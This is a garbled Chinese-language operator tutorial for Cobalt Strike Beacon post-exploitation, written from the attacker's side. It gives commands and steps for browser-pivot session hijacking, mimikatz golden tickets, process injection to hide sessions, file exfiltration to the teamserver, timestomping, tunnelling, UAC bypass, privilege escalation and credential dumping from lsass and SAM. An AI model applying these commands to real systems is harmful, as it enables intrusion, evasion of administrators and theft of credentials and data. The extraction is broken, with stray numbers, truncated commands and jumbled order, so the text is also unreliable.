\u653b\u51fb\u8005/\u64cd\u4f5c\u8005\u901a\u8fc7\u53d1\u51fa\u547d\u4ee4\u6765\u521b\u5efa\u6d4f\u89c8\u5668\u67a2\u8f74browserpivot \u4fe1\u6807\u901a\u8fc7\u7ed1\u5b9a\u548c\u4fa6\u542c\u7aef\u53e3\uff08\u4f8b\u5982\u8bf46605\uff09\uff0c\u5728\u53d7\u5bb3\u7cfb\u7edf\u4e0a\u521b\u5efa\u4ee3\u7406\u670d\u52a1\u5668\uff08\u66f4\u7cbe\u786e \u5730\u8bf4\uff0c\u5728Internet Explorer\u8fdb\u7a0b\u4e2d\uff09\u3002 \u56e2\u961f\u670d\u52a1\u5668\u7ed1\u5b9a\u5e76\u5f00\u59cb\u4fa6\u542c\u7aef\u53e3\uff0c\u4f8b\u598233912 \u653b\u51fb\u8005\u73b0\u5728\u53ef\u4ee5\u4f7f\u7528\u4ed6\u4eec\u7684teamserver\uff1a33912\u4f5c\u4e3aWeb\u4ee3\u7406\u3002\u901a\u8fc7\u6b64\u4ee3\u7406\u7684\u6240\u6709\u6d41 \u91cf\u90fd\u5c06\u901a\u8fc7Internet Explorer\u8fdb\u7a0b\uff08\u7aef\u53e36605\uff09\u8f6c\u53d1/\u904d\u5386\u5728\u53d7\u5bb3\u8005\u7cfb\u7edf\u4e0a\u6253\u5f00\u7684 \u4ee3\u7406\u3002\u7531\u4e8eInternet Explorer\u4f9d\u8d56WinINet\u5e93\u6765\u7ba1\u7406Web\u8bf7\u6c42\u548c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u56e0\u6b64\u5c06\u5bf9 \u653b\u51fb\u8005\u7684Web\u8bf7\u6c42\u8fdb\u884c\u91cd\u65b0\u8eab\u4efd\u9a8c\u8bc1\uff0c\u4ece\u800c\u4f7f\u653b\u51fb\u8005\u53ef\u4ee5\u67e5\u770b\u53d7\u5bb3\u8005\u5177\u6709\u6d3b\u52a8\u4f1a\u8bdd\u7684 \u76f8\u540c\u5e94\u7528\u7a0b\u5e8f\uff0c\u800c\u65e0\u9700\u8981\u6c42\u767b\u5f55\u3002 \u5229\u7528\u624b\u6cd5; 1 browserpivot 244 x86 \u5de6\u4fa7-\u53d7\u5bb3\u7cfb\u7edf\u5df2\u767b\u5f55\u5230\u67d0\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff0c\u53f3\u4fa7-\u653b\u51fb\u8005ID\u8bd5\u56fe\u8bbf\u95ee\u540c\u4e00\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u7531\u4e8e\u672a \u901a\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u800c\u663e\u793a\u767b\u5f55\u5c4f\u5e55\uff1a \u5982\u679c\u653b\u51fb\u8005\u5f00\u59cb\u901a\u8fc7\u53d7\u5bb3\u8005\u4ee3\u7406\u6765\u4ee3\u7406\u5176\u7f51\u7edc\u6d41\u91cf\uff0c\u5219\u60c5\u51b5\u5c06\u53d1\u751f\u53d8\u5316\uff1a10.0.0.5:33912 2.powershell-import \u5bfc\u5165\u5404\u79cdpowershell\u6e17\u900f\u6846\u67b6\uff0c\u76f4\u63a5\u6267\u884c\uff1a \u6216\u8005\u76f4\u63a5\u6267\u884c\uff1a \u8981\u6267\u884c\u67d0\u6a21\u5757\u76f4\u63a5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4,\u6bd4\u5982 3.kerberos \u5171\u6709\u4e09\u4e2a\u6a21\u5757 \u4e5f\u5c31\u662f\u57df\u4e2d\u5e38\u7528\u7684\u624b\u6bb5 \u666e\u901a\u7968\u636e\u3001\u91d1\u94f6\u7968\u636e\u4f20\u9012\u653b\u51fb \u4f7f\u7528mimikatz: beacon> powershell-import powershell-import [/path/to/local/script.ps1] beacon> powershell xxx-xxx kerberos_ccache_use \u4ececache\u6587\u4ef6\u4e2d\u5bfc\u5165\u7968\u636e kerberos_ticket_purge \u6e05\u9664\u5f53\u524d\u4f1a\u8bdd\u7684\u7968\u636e kerberos_ticket_use \u4eceticket\u6587\u4ef6\u4e2d\u5bfc\u5165\u7968\u636e 1 1 1 1 2 3 4.\u5728\u6ca1\u6709powershell.exe\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528powershell \u4f7f\u7528powerpick\u547d\u4ee4\u53ef\u5728\u6ca1\u6709powershell.exe\u7684\u60c5\u51b5\u4e0b\u6267\u884cPowerShell \u547d\u4ee4 \u8be5\u547d\u4ee4\u5c06\u6ce8\u5165\u975e\u6258\u7ba1\u7684PowerShell\u4e3a\u7279\u5b9a\u7684\u8fc7\u7a0b\uff0c\u5e76\u4ece\u8be5\u4f4d\u7f6e\u8fd0\u884c\u7684cmdlet 5.\u5728\u6ca1\u6709CMD.exe\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528CMD\u547d\u4ee4 \u4f7f\u7528run\u547d\u4ee4\u6267\u884c\u4e0d\u5e26cmd.exe\u7684\u547d\u4ee4\u3002\u8fd0\u884c\u547d\u4ee4\u5c06\u8f93\u51fa\u8f93\u51fa\u7ed9\u60a8\u3002\u5728\u6267\u884c\u547d\u4ee4\u5728\u540e\u53f0\u8fd0 \u884c\u7684\u7a0b\u5e8f\u5e76\u4e0d\u80fd\u6355\u83b7\u8f93\u51fa\u3002 1 kerberos::golden /admin:USER /domain:DOMAIN /sid:SID /krbtgt:HASH /ticket:FIL 6.\u66f4\u6539shell\u7684\u8def\u5f84 \u5982\u679c\u5e0c\u671bBeacon\u4ece\u7279\u5b9a\u76ee\u5f55\u6267\u884c\u547d\u4ee4\uff0c\u53ef\u4ee5\u5728Beacon\u63a7\u5236\u53f0\u4e2d\u4f7f\u7528cd\u547d\u4ee4\u6765\u5207\u6362 Beacon\u8fdb\u7a0b\u7684\u5de5\u4f5c\u76ee\u5f55\u3002\u4f7f\u7528pwd\u547d\u4ee4\u83b7\u53d6shell\u7684\u76ee\u5f55\u3002 \u7136\u540e\u4f7f\u7528cd\u547d\u4ee4\u5c31\u53ef\u4ee5\u5207\u6362\u4e86\uff0cSETENV\u547d\u4ee4\u5c06\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u3002 7.\u8fdb\u7a0b\u6ce8\u5165 \u8fdb\u7a0b\u6ce8\u5165\u6211\u4eec\u8fd9\u91cc\u6f14\u793a\u4e8c\u79cd\u65b9\u6cd5 \u5206\u522b\u662f inject\u547d\u4ee4\u548cspawnto\u547d\u4ee4 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0ccs\u5728rundll32.exe\u4e2d\u4ea7\u751f\u4e00\u4e2a\u4f1a\u8bdd\u3002\u8fd0\u7ef4\u7ba1\u7406\u5458\u53ef\u80fd\u4f1a\u53d1\u73b0rundll32.exe\u5b9a \u671f\u4e0eInternet\u5efa\u7acb\u8fde\u63a5\u5f88\u5947\u602a\u3002\u4f7f\u7528\u67e5\u627e\u4e00\u4e2a\u66f4\u597d\u7684\u7a0b\u5e8f\uff08\u4f8b\u5982Internet Explorer\uff09\uff0c\u7136\u540e \u6ce8\u5165\u5230\u5b83\u7684\u8fdb\u7a0b\u4e2d\u53bb\uff0c\u53ef\u4ee5\u6709\u6548\u9690\u85cf\u4f1a\u8bdd 1.\u4f7f\u7528spawn\u547d\u4ee4 \u4f7f\u7528ps\u547d\u4ee4\u5217\u51fa\u8fdb\u7a0b \u4f7f\u7528spawnt\u547d\u4ee4\u6ce8\u5165\u5230\u67d0\u4e00\u8fdb\u7a0b\u4e2d \u8bbe\u7f6e\u76d1\u542c\u5668 1 spawn [x86/x68] [\u8fdb\u7a0b\u540d\u5b57/\u8def\u5f84] \u6ce8\u5165\u6210\u529f\u4f1a\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u4f1a\u8bdd 2.\u4f7f\u7528inject\uff0c\u540e\u9762\u63a5\u8fdb\u7a0bID\u548c\u4fa6\u542c\u5668\u540d\u79f0\uff0c\u4ee5\u5c06\u4f1a\u8bdd\u6ce8\u5165\u5230\u7279\u5b9a\u8fdb\u7a0b\u4e2d\u3002 1.\u4f7f\u7528ps\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u4e0a\u7684\u8fdb\u7a0b\u5217\u8868\u3002 2.\u4f7f\u7528inject [pid] x64\u5c0664\u4f4d\u4fe1\u6807\u6ce8\u5165\u5230x64\u8fdb\u7a0b\u4e2d\u3002\u4e5f\u53ef\u4ee5\u6ce8\u5165x86\u4e2d 3.\u8bbe\u7f6e\u76d1\u542c\u5668 4.\u6ce8\u5165\u6210\u529f\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684shell \u4e00\u4e2a\u5229\u7528\u624b\u6cd5\uff1a \u53d7\u5bb3\u7cfb\u7edf\u4e0a\u7684\u4efb\u4f55\u8fdb\u7a0b\u4e0b\u6267\u884cPowershell\u811a\u672c\u3002 1 psinject \u3010pid\u3011[ ps1] \u7eff\u8272\u7a81\u51fa\u663e\u793a\u7684\u662f\u5728\u6ce8\u5165powershell\u811a\u672c\u65f6\u5728\u76ee\u6807\u8fdb\u7a0b\u4e2d\u6253\u5f00\u7684\u65b0\u53e5\u67c4\uff1a spawn\u548cinject\u547d\u4ee4\u90fd\u5c06\u6709\u6548\u8f7d\u8377\u9636\u6bb5\u6ce8\u5165\u5230\u5185\u5b58\u4e2d\u3002\u5982\u679c\u6709\u6548\u8d1f\u8f7d\u9636\u6bb5\u662fHTTP\uff0c HTTPS\u6216DNS\u4fe1\u6807\uff0c\u5e76\u4e14\u5b83\u65e0\u6cd5\u5230\u8fbeCS-\u6211\u4eec\u5c06\u770b\u4e0d\u5230\u4f1a\u8bdd\u3002\u5982\u679c\u6709\u6548\u8d1f\u8f7d\u9636\u6bb5\u662f\u7ed1\u5b9a TCP\u6216SMB\u4fe1\u6807\uff0c\u5219\u8fd9\u4e9b\u547d\u4ee4\u5c06\u81ea\u52a8\u5c1d\u8bd5\u94fe\u63a5\u5e76\u627f\u62c5\u5bf9\u8fd9\u4e9b\u6709\u6548\u8d1f\u8f7d\u7684\u63a7\u5236\u3002 8.Runu\u5141\u8bb8\u6211\u4eec\u4ece\u6307\u5b9a\u7684\u7236\u8fdb\u7a0b\u542f\u52a8\u65b0\u8fdb\u7a0b\uff1a 8.Upload and Download Files \u4e0b\u8f7ddownload runu [pid] \u65b0\u8fdb\u7a0b download [\u76ee\u6807\u6587\u4ef6\u76ee\u5f55] 1 1 \u4fe1\u6807\u662f\u4e3a\u4f4e\u901f\u548c\u6162\u901f\u6570\u636e\u6cc4\u9732\u800c\u6784\u5efa\u7684\u3002\u5728\u6bcf\u6b21\u7b7e\u5165\u8fc7\u7a0b\u4e2d\uff0cBeacon\u4f1a\u4e0b\u8f7d\u4efb\u52a1\u6307\u5b9a\u8981 \u83b7\u53d6\u7684\u6bcf\u4e2a\u6587\u4ef6\u7684\u56fa\u5b9a\u5757\u3002\u8be5\u5757\u7684\u5927\u5c0f\u53d6\u51b3\u4e8e\u4fe1\u6807\u7684\u5f53\u524d\u6570\u636e\u901a\u9053\u3002HTTP\u548cHTTPS\u901a \u9053\u4ee5512KB\u7684\u5757\u5f62\u5f0f\u63d0\u53d6\u6570\u636e\u3002 \u8f6c\u5230\u67e5\u770b-> Cobalt Strike\u4e2d\u7684\u4e0b\u8f7d\uff0c\u4ee5\u67e5\u770b\u60a8\u7684\u56e2\u961f\u5230\u76ee\u524d\u4e3a\u6b62\u5df2\u4e0b\u8f7d\u7684\u6587\u4ef6\u3002\u6b64\u9009\u9879 \u5361\u4e2d\u4ec5\u663e\u793a\u5b8c\u6210\u7684\u4e0b\u8f7d\u3002\u4e0b\u8f7d\u7684\u6587\u4ef6\u5b58\u50a8\u5728\u56e2\u961f\u670d\u52a1\u5668\u4e0a\u3002\u8981\u5c06\u6587\u4ef6\u5e26\u56de\u7cfb\u7edf\uff0c\u8bf7\u5728\u6b64 \u5904\u7a81\u51fa\u663e\u793a\u5b83\u4eec\uff0c\u7136\u540e\u6309Sync Files\u3002\u7136\u540e\uff0cCobalt Strike\u5c06\u9009\u62e9\u7684\u6587\u4ef6\u4e0b\u8f7d\u5230\u7cfb\u7edf\u4e0a\u60a8 \u9009\u62e9\u7684\u6587\u4ef6\u5939\u4e2d\u3002 \u4e0a\u4f20\u6587\u4ef6upload 1 upload [/path/to/file] \u4e0a\u4f20\u6587\u4ef6\u65f6\uff0c\u6709\u65f6\u4f1a\u9700\u8981\u66f4\u65b0\u5176\u65f6\u95f4\u6233\uff0c\u4ee5\u4f7f\u5176\u4e0e\u540c\u4e00\u6587\u4ef6\u5939\u4e2d\u7684\u5176\u4ed6\u6587\u4ef6\u878d\u5408\u3002 \u53ef\u4ee5\u4f7f\u7528timestomp\u547d\u4ee4\u6267\u884c\u6b64\u64cd\u4f5c\u3002 timestomp\u547d\u4ee4\u4f1a\u5c06\u4e00\u4e2a\u6587\u4ef6\u7684\u201c\u4fee\u6539\u201d\uff0c\u201c\u8bbf\u95ee\u201d\u548c\u201c\u521b\u5efa\u201d\u65f6\u95f4\u4e0e\u53e6\u4e00\u4e2a\u6587\u4ef6\u8fdb\u884c\u5339\u914d\u3002 9.\u6587\u4ef6\u7cfb\u7edf\u547d\u4ee4 \u4f7f\u7528ls\u547d\u4ee4\u5217\u51fa\u5f53\u524d\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u3002\u4f7f\u7528mkdir\u521b\u5efa\u76ee\u5f55\u3002rm\u5c06\u5220\u9664\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u3002cp\u5c06 \u6587\u4ef6\u590d\u5236\u5230\u76ee\u6807\u4f4d\u7f6e\u3002mv\u79fb\u52a8\u6587\u4ef6\u3002 10.\u53cd\u5411\u67a2\u8f74 \u7aef\u53e3\u505c\u6b62\u3010\u7ed1\u5b9a\u7aef\u53e3\u3011 \u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u7ed1\u5b9a\u6307\u5b9a\u7684\u7aef\u53e3\u3002\u5f53\u8fde\u63a5\u8fdb\u6765\u65f6\uff0cCobaltStrike\u5c06\u8fde\u63a5\u5230\u8f6c\u53d1\u7684\u4e3b\u673a/\u7aef\u53e3\u5e76 \u4f7f\u7528Beacon\u5728\u4e24\u4e2a\u8fde\u63a5\u4e4b\u95f4\u4e2d\u7ee7\u901a\u4fe1\u3002 \u4f7f\u7528rportfwd stop [bind port]\u7981\u7528\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1\u3002 11.\u751f\u6210\u548c\u96a7\u9053 \u4f7f\u7528spunnel\u547d\u4ee4\u53ef\u5728\u4e34\u65f6\u8fc7\u7a0b\u4e2d\u751f\u6210\u7b2c\u4e09\u65b9\u5de5\u5177\uff0c\u5e76\u4e3a\u5176\u521b\u5efa\u53cd\u5411\u7aef\u53e3\u3002 \u8be5\u547d\u4ee4\u671f\u671b\u4ee3\u7406\u6587\u4ef6\u662f\u4e0e\u4f4d\u7f6e\u65e0\u5173\u7684shellcode\uff08\u901a\u5e38\u662f\u6765\u81ea\u53e6\u4e00\u4e2a\u653b\u51fb\u5e73\u53f0\u7684\u539f\u59cb\u8f93 \u51fa\uff09\u3002\u8be5spunnel_local\u547d\u4ee4\u662f\u4e00\u6837\u7684spunnel\uff0c\u9664\u4e86\u5b83\u5f00\u59cb\u4ece\u4f60\u7684cs\u5ba2\u6237\u7aef\u63a7\u5236\u5668\u8fde\u63a5\u3002 timestomp [fileA] [fileB] \u4f7f\u7528\uff1arportfwd [\u7ed1\u5b9a\u7aef\u53e3] [\u8f6c\u53d1\u4e3b\u673a] [\u8f6c\u53d1\u7aef\u53e3] \u8bed\u6cd5\u4e3aspunnel [x86\u6216x64] [controller host] [controller port] [/path/to/agent. 1 1 1 \u901a\u8fc7Cobalt Strike\u5ba2\u6237\u7aef\u4e0e\u5176\u56e2\u961f\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u8fde\u63a5\u6765\u901a\u4fe1spunnel_local\u901a\u4fe1\u3002 12.\u7279\u6743\u63d0\u5347 \u5229\u7528\u6f0f\u6d1e\u63d0\u5347 \u8f93\u5165elevate\u547d\u4ee4\u4ee5\u5217\u51fa\u5728Cobalt Strike\u4e2d\u6ce8\u518c\u7684\u7279\u6743\u5347\u7ea7\u6f0f\u6d1e\u3002 \u6210\u529f\u4e4b\u540e\u4f1a\u53cd\u5f39\u65b0\u7684\u4f1a\u8bdd\u56de\u6765 \u5355\u72ec\u4f7f\u7528runasadmin\u547d\u4ee4\u53ef\u4ee5\u5217\u51fa\u5728Cobalt Strike\u4e2d\u7684\u6f0f\u6d1e\u3002 1 \u8fd0\u884celevate [exploit] [listener]\u5c1d\u8bd5\u63d0\u5347\u7279\u5b9a\u7684\u5229\u7528\u3002 \u8fd0\u884crunasadmin [exploit] [command + args]\u5c1d\u8bd5bypassUac\u63d0\u6743\u3002 \u4f7f\u7528\u5df2\u77e5\u51ed\u8bc1\u63d0\u5347 \u4f7f\u7528runas [DOMAIN user] [password] [command]\u4ee5\u5176\u4ed6\u7528\u6237\u7684\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4\u3002 runas\u547d\u4ee4\u5c06\u4e0d\u8fd4\u56de\u4efb\u4f55\u8f93\u51fa\u3002 \u8fd9\u91cc\u7ed9\u4e2a\u624b\u6cd5\uff1a\u53ef\u4ee5\u4f7f\u7528poweshell \u8fdc\u7a0b\u6267\u884c\u4e0a\u7ebf \u4f7f\u7528spawnas [DOMAIN user] [password] [listener]\u4f7f\u7528\u5176\u51ed\u636e\u4ee5\u53e6\u4e00\u4e2a\u7528\u6237\u7684\u8eab\u4efd\u751f\u6210 \u4f1a\u8bdd\u3002\u6b64\u547d\u4ee4\u4ea7\u751f\u4e00\u4e2a\u4e34\u65f6\u8fdb\u7a0b\uff0c\u5e76\u5c06\u6211\u4eec\u7684\u6709\u6548\u8d1f\u8f7d\u9636\u6bb5\u6ce8\u5165\u8fdb\u7a0b\u4e2d\u3002 \u4e5f\u53ef\u4ee5\u8f6c\u5230[beacon]-> Access-> Spawn As\u4e5f\u8fd0\u884c\u6b64\u547d\u4ee4\u3002 \u4f7f\u7528\u547d\u4ee4 \u4f7f\u7528getsystem\u6a21\u62dfSYSTEM\u5e10\u6237\u7684\u4ee4\u724c\u3002\u8fd9\u79cd\u8bbf\u95ee\u6743\u9650\u7ea7\u522b\u53ef\u4ee5\u8ba9\u6211\u4eec\u6267\u884c\u7279\u6743\u64cd\u4f5c\uff0c \u800c\u8fd9\u4e9b\u64cd\u4f5c\u662f\u7ba1\u7406\u5458\u7528\u6237\u65e0\u6cd5\u6267\u884c\u7684\u3002 \u5177\u4f53\u6210\u529f\u4e0e\u5426\u770b\u5b9e\u9645\u73af\u5883 \u83b7\u53d6SYSTEM\u7684\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u521b\u5efa\u8fd0\u884c\u6709\u6548\u8d1f\u8f7d\u7684\u670d\u52a1\u3002 \u5b83\u5c06\u5220\u9664\u8fd0\u884c\u6709\u6548\u8d1f\u8f7d\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u521b\u5efa\u670d\u52a1\u4ee5\u8fd0\u884c\u5b83\uff0c\u627f\u62c5\u5bf9\u6709\u6548\u8d1f\u8f7d\u7684\u63a7\u5236\uff0c\u5e76 \u6e05\u7406\u670d\u52a1\u548c\u53ef\u6267\u884c\u6587\u4ef6\u3002 13.UAC\u7ed5\u8fc7 Microsoft\u5728Windows Vista\u4e2d\u5f15\u5165\u4e86\u7528\u6237\u5e10\u6237\u63a7\u5236\uff08UAC\uff09\u5e76\u5728Windows 7\u4e2d\u5bf9\u5176\u8fdb\u884c\u4e86 \u6539\u8fdb\u3002UAC\u7684\u5de5\u4f5c\u539f\u7406\u4e0eUNIX\u4e2d\u7684sudo\u76f8\u4f3c\u3002\u7528\u6237\u6bcf\u5929\u90fd\u4ee5\u666e\u901a\u7279\u6743\u5de5\u4f5c\u3002\u5f53\u7528\u6237\u9700\u8981 \u6267\u884c\u7279\u6743\u64cd\u4f5c\u65f6\uff0c\u7cfb\u7edf\u4f1a\u8be2\u95ee\u4ed6\u4eec\u662f\u5426\u8981\u63d0\u5347\u5176\u6743\u9650\u3002 Cobalt Strike\u9644\u5e26\u4e86\u4e24\u6b21UAC\u65c1\u8def\u653b\u51fb\u3002 ELEVATE SVC-EXE [\u76d1\u542c] elevate uac-token-duplication [listener] runasadmin uac-token-duplication [command] runasadmin uac-cmstplua [comman 1 1 2 elevate uac-token-duplication [listener] \u5c06\u4ea7\u751f\u4e00\u4e2a\u6743\u9650\u63d0\u5347\u7684\u4e34\u65f6\u8fdb\u7a0b\uff0c\u5e76\u5411\u5176\u4e2d\u6ce8\u5165\u6709\u6548\u8d1f\u8f7d\u9636\u6bb5\u3002\u6b64\u653b\u51fb\u4f7f\u7528 UAC\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u5141\u8bb8\u672a\u63d0\u5347\u7684\u8fdb\u7a0b\u4f7f\u7528\u4ece\u63d0\u5347\u7684\u8fdb\u7a0b\u7a83\u53d6\u7684\u4ee4\u724c\u542f\u52a8\u4efb\u610f \u8fdb\u7a0b\u3002\u6b64\u6f0f\u6d1e\u9700\u8981\u653b\u51fb\u624d\u80fd\u5220\u9664\u5206\u914d\u7ed9\u63d0\u5347\u4ee4\u724c\u7684\u591a\u4e2a\u6743\u9650\u3002\u65b0\u4f1a\u8bdd\u7684\u529f\u80fd \u5c06\u53cd\u6620\u8fd9\u4e9b\u53d7\u9650\u5236\u7684\u6743\u5229\u3002\u5982\u679c\u59cb\u7ec8\u901a\u77e5\u5904\u4e8e\u6700\u9ad8\u8bbe\u7f6e\uff0c\u5219\u6b64\u653b\u51fb\u8981\u6c42\u5f53\u524d \u684c\u9762\u4f1a\u8bdd\u4e2d\u5df2\u7ecf\u4ee5\u540c\u4e00\u7528\u6237\u8eab\u4efd\u8fd0\u884c\u4e86\u63d0\u5347\u7684\u8fdb\u7a0b\u3002 \u6b64\u653b\u51fb\u9002\u7528\u4e8e2018\u5e7411\u6708\u66f4\u65b0\u4e4b\u524d\u7684Windows 7\u548cWindows 10\u3002 \u8981\u68c0\u67e5\u5f53\u524d\u7528\u6237\u662f\u5426\u5728Administrators\u7ec4\u4e2d\uff0c\u8bf7\u4f7f\u7528shell whoami / groups\u3002 \u4f7f\u7528elevate uac-token-duplication msf1 \u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u4f1a\u8bdd \u5982\u679c\u4e0d\u5728Administrators\u7ec4\u4e2d \u76ee\u6807\u673a\u5668\u5f39\u51faUAC\uff0c\u65e0\u6cd5\u5229\u7528 runasadmin uac-token-duplication [command] /runasadmin uac-cmstplua [command] \u4e0e\u4e0a\u8ff0\u653b\u51fb\u76f8\u540c\uff0c\u4f46\u662f\u6b64\u5229\u7528\u6210\u529f\u4e0d\u4f1a\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u4f1a\u8bdd\u800c\u662f\u5728\u63d0\u5347\u7684\u73af\u5883\u4e2d\u8fd0\u884c\u6211\u4eec \u8981\u9009\u62e9\u7684\u547d\u4ee4\u3002 \u5229\u7528\u6761\u4ef6\u4e5f\u662f\u548c\u524d\u9762\u4e00\u6837 \u5982\u679c\u4e0d\u5728Administrators\u7ec4\u4e2d 14.getprivs \u6bcf\u4e2a\u7cfb\u7edf\u90fd\u6709\u4e00\u4e2a\u5e10\u6237\u6570\u636e\u5e93\uff0c\u7528\u4e8e\u5b58\u50a8\u7528\u6237\u5e10\u6237\u548c\u7ec4\u5e10\u6237\u6240\u62e5\u6709\u7684\u7279\u6743\u3002\u5f53\u7528\u6237\u767b\u5f55 \u65f6\uff0c\u7cfb\u7edf\u4f1a\u751f\u6210\u4e00\u4e2a\u8bbf\u95ee\u4ee4\u724c\uff0c\u5176\u4e2d\u5305\u542b\u7528\u6237\u7279\u6743\u7684\u5217\u8868\uff0c\u5305\u62ec\u6388\u4e88\u7528\u6237\u6216\u7528\u6237\u6240\u5c5e\u7ec4 \u7684\u7279\u6743\u3002\u8bf7\u6ce8\u610f\uff0c\u7279\u6743\u4ec5\u9002\u7528\u4e8e\u672c\u5730\u8ba1\u7b97\u673a\u3002\u57df\u5e10\u6237\u5728\u4e0d\u540c\u7684\u8ba1\u7b97\u673a\u4e0a\u53ef\u4ee5\u5177\u6709\u4e0d\u540c\u7684 \u7279\u6743\u3002 \u5f53\u7528\u6237\u5c1d\u8bd5\u6267\u884c\u7279\u6743\u64cd\u4f5c\u65f6\uff0c\u7cfb\u7edf\u68c0\u67e5\u7528\u6237\u7684\u8bbf\u95ee\u4ee4\u724c\u4ee5\u786e\u5b9a\u8be5\u7528\u6237\u662f\u5426\u62e5\u6709\u5fc5\u8981\u7684\u7279 \u6743\uff0c\u5982\u679c\u662f\uff0c\u5219\u68c0\u67e5\u662f\u5426\u542f\u7528\u4e86\u7279\u6743\u3002\u5982\u679c\u7528\u6237\u672a\u901a\u8fc7\u8fd9\u4e9b\u6d4b\u8bd5\uff0c\u5219\u7cfb\u7edf\u4e0d\u4f1a\u6267\u884c\u8be5\u64cd \u4f5c\u3002 \u5728CS\u79cd\u53ef\u4ee5\u4f7f\u7528getprivs\u6765\u786e\u5b9a\u8bbf\u95ee\u4ee4\u724c\u662f\u5426\u6301\u6709\u6307\u5b9a\u7684\u7279\u6743\u96c6\u3002 \u5173\u4e8ePrivileges\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u672c\u6587\u4e0d\u591a\u63cf\u8ff0\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u67e5\u770b\u6211\u7684\u53e6\u4e00\u7bc7\u6587\u7ae0\u3002 15.\u51ed\u636e\u5bfc\u51fa \u51ed\u636e\u8bf4\u7684\u901a\u4fd7\u6613\u61c2\u4e00\u70b9\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u76ee\u6807\u673a\u7684\u8d26\u53f7\uff0c\u5bc6\u7801 \u51ed\u636e\u5bfc\u51fa\u662f\u6e17\u900f\u6d4b\u8bd5\u4e2d\u5373\u4e3a\u91cd\u8981\u7684\u6b65\u9aa4\uff0c\u5bfc\u51fa\u76ee\u6807\u673a\u51ed\u636e\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u51ed\u636e\u5b9e\u73b0\u6a2a \u5411\u79fb\u52a8\uff08\u5229\u7528hash\u4f20\u9012\uff0csmb/rdp\u7206\u7834\u7b49\u7b49\u624b\u6cd5\uff09\u6765\u6269\u5927\u6211\u4eec\u7684\u6218\u679c windows\u901a\u5e38\u4f7f\u7528\u4e24\u79cd\u65b9\u6cd5\u5bf9\u7528\u6237\u7684\u5bc6\u7801\u8fdb\u884c\u52a0\u5bc6\uff0c\u5728\u57df\u73af\u5883\u4e2d\uff0c\u7528\u6237\u4fe1\u606f\u52a0\u5bc6\u6210\u6563\u5217\u503c \u540e\u5b58\u5728ntds.dit\u4e2d\u3002 windows\u5bc6\u7801\u7ec4\u6210\uff1a windows hash \u7ed3\u6784\uff1a \u6ce8\u610f\uff1a LM hash \uff08DES\u52a0\u5bc6\uff09\uff0cNTLM hash \uff08MD4\uff09\u5177\u4f53\u624b\u6cd5\u770b\u5b9e\u6218\u73af\u5883 username\uff1aRID\uff1alm-hash\uff1ant-hash 1 1 \u4ecewindows vita \u548cwindows server 2008 \u5f00\u59cb windows\u5c31\u9ed8\u8ba4\u7981\u7528LM-hash\u4e86\uff08\u91cd\u70b9\uff1a\u8fd9 \u91cc\u662f\u7981\u7528 \u4e0d\u662f\u5f03\u7528\uff09\u6539\u7528NTLM hash\u8ba4\u8bc1\u4e86 LM-hash\u660e\u6587\u5bc6\u7801\u9650\u572814\u4f4d\uff08\u5b89\u5168\u6027\u4e0d\u9ad8\uff09 \u8fd8\u6709\u4e00\u70b9\uff1a\u5982\u679c\u7981\u7528LM-hash\u4e86\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u80fd\u6349\u5230aad3b435b51404eeaad51404ee\u3002 \u5f53\u7136\u4e5f\u53ef\u80fd\u662fLM-hash\u4e3a\u7a7a\u503c\u3002 \u5982\u679c\u76ee\u6807\u5173\u95ed\u4e86Wdigest\u529f\u80fd/\u5b89\u88c5\u4e86\u8865\u4e01kb2871997\u7684\u8bdd\u662f\u65e0\u6cd5\u4ece\u5185\u5b58\u4e2ddump\u660e\u6587\u5bc6\u7801 \u7684\u3002Windows server 2012\u4ee5\u4e0a\u9ed8\u8ba4\u5173\u95edWdigest\u529f\u80fd\u3002 \u6761\u4ef6\uff1a\u6743\u9650\u4e00\u5b9a\u5f97\u662fsystem\u6743\u9650 \u539f\u7406\uff1a\u672c\u5730\u7684\u7528\u6237\u540d\uff0c\u6563\u5217\u503c\u548c\u5176\u5b83\u5b89\u5168\u4fe1\u606f\u90fd\u5b58\u5728 SAM\uff08c:\\windows\\system32\\config\uff09\u6587\u4ef6\u4e2d\uff0clsass.exe\u8fdb\u7a0b\u7528\u4e8e\u5b9e\u73b0Windows\u7684\u5b89\u5168\u7b56 \u7565\uff08\u672c\u5730\u548c\u767b\u5f55\u7b56\u7565\uff09\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5de5\u5177\u628a\u6563\u5217\u503c\u548c\u660e\u6587\u5bc6\u7801\u4ece\u5185\u5b58\u4e2d\u7684 lsass.exe\u8fdb\u7a0b/SAM\u6587\u4ef6\u4e2d\u5bfc\u51fa Hashdump\u5bfc\u51fahash \u9009\u62e9beacon\u4f1a\u8bdd\u53f3\u952e,\u9009\u62e9\u6267\u884c\u2013>\u8f6c\u50a8Hash\uff0c\u6216\u5728beacon\u4e2d\u8f93\u5165hashdump 